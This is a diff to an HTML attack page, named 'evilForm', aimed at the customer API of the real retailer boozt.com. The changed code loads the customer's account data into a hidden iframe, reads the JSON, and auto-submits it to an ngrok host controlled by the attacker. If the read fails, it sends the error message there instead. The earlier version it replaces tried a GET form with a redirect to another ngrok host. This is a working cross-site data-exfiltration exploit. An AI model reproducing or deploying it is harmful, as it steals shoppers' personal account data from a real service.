@@ -1,11 +1,27 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <form id="evilForm" method="GET" action="https://www.boozt.com/at/de-at/api/customer">
-        <input type="hidden" name="redirect" value="https://7766-2804-4580-1080-7db-e5f3-62e8-de0e-c67e.ngrok-free.app/">
+    <form id="evilForm" method="POST" action="https://1333-2804-4580-1080-7db-6197-e5c8-57e1-8c08.ngrok-free.app/">
+        <input type="hidden" name="data">
     </form>
+    <iframe id="dataFrame" style="display:none;"></iframe>
     <script>
-        document.getElementById("evilForm").submit();
+        // Carregar os dados no iframe
+        const iframe = document.getElementById("dataFrame");
+        iframe.src = "https://www.boozt.com/at/de-at/api/customer";
+
+        iframe.onload = function() {
+            try {
+                // Extrair o JSON do corpo do iframe
+                const data = iframe.contentWindow.document.body.textContent;
+                document.querySelector("input[name=data]").value = data;
+                document.getElementById("evilForm").submit();
+            } catch (e) {
+                // Logar erro se falhar
+                document.querySelector("input[name=data]").value = JSON.stringify({ error: e.message });
+                document.getElementById("evilForm").submit();
+            }
+        };
     </script>
 </body>
 </html>
